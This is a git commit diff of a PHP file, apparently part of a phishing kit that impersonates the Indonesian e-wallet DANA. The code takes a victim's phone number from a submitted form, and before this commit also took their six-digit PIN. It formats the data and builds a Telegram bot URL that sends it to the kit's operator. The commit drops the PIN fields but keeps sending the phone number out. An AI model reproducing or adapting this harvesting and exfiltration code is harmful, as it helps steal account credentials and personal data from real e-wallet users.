1a55db38f1b8dc3d5e88199e823cba8484bbfa0d
websiteappsd <developer_linkz@outlook.com>
2024-11-03 03:25:47 +0700

    Update one.php

--- public/one.php
+++ public/one.php
@@ -3,10 +3,9 @@
 session_start();
 include "./telegram.php";
  
-$text = "├•★𝓓𝓪𝓷𝓪 𝓘𝓷𝓭𝓸𝓷𝓮𝓼𝓲𝓪★". "\n├───────────────────". "\n<b>├•𖥔 ɴᴏᴍᴏʀ ʜᴘ : </b>".  $_POST['nomor']. "\n<b>├•𖥔 ᴘɪɴ ᴅᴀɴᴀ : </b>".  $_POST['pin1']. $_POST['pin2']. $_POST['pin3']. $_POST['pin4']. $_POST['pin5']. $_POST['pin6']. "\n╰───────────────────";;
+$text = "├•★𝓓𝓪𝓷𝓪 𝓘𝓷𝓭𝓸𝓷𝓮𝓼𝓲𝓪★". "\n├───────────────────". "\n<b>├•𖥔 ɴᴏᴍᴏʀ ʜᴘ : </b>".  $_POST['nomor']. "\n╰───────────────────";;
 
 $query = http_build_query([
     'text' => $text,
 ]);
 $url = "https://api.telegram.org/bot{$botApiToken}/chat_id{$chat_id}/tezyparse_mode=html";
-?>
